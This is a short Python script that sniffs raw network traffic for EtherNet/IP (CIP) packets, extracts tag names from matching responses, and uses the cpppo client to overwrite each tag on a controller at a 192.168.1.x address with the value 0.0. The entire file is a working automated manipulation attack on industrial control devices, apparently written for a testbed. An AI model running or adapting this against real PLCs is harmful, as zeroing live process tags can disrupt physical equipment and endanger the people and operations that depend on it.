import socket
import subprocess
import shlex

def packetCap():
    host = socket.gethostname()
    cpppo = ' python3 -m cpppo.server.enip.client -a 192.168.1.' + host[-1]+'0:44818 '
    s = socket.socket(socket.AF_PACKET,socket.SOCK_RAW,socket.htons(0x003))
    while True:

        packet = s.recvfrom(65565)
        if  packet[1][2] ==4 :
           # print(packet[0].hex(' '))
           # print(packet[1])
        
        #if packet[0][:12] == b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00':
       
        #outgoing packet ->response
            #packet = packet[0][66:]
            if len(packet[0]) > 120:
                if packet[0][66:68]==b'\x6f\x00':
                    if packet[0][96:98] == b'\x02\x00' and packet[0][98:100] == b'\x00\x00' and \
                        packet[0][100:102] == b'\x00\x00' and packet[0][102:104] == b'\xb2\x00' :
                        if packet[0][106:108] == b'\x52\x02':
                        #here we are in response, save the value
                            
                            cpppo_cmd = cpppo +packet[0][120:120+packet[0][119]].decode("ASCII") + "=0.0"
                            print(cpppo_cmd)
                           
                            cmd = shlex.split(cpppo_cmd)
                                # print 'DEBUG enip _send cmd shlex list: ', cmd
                            client = subprocess.Popen(cmd, shell=False)
                            client.wait()
                            
                                   
if __name__ == '__main__':
    packetCap()